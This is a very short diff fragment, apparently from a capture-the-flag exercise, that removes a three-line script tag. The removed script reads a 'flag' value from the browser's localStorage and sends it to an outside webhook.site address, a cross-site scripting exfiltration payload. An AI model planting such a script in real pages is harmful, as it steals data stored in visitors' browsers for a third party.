@@ -1,3 +1,0 @@
-<script>
-  fetch("https://webhook.site/08a45b55-326c-4ad1-808c-061eb0b2b12e?flag=" + localStorage.getItem("flag"));
-</script>
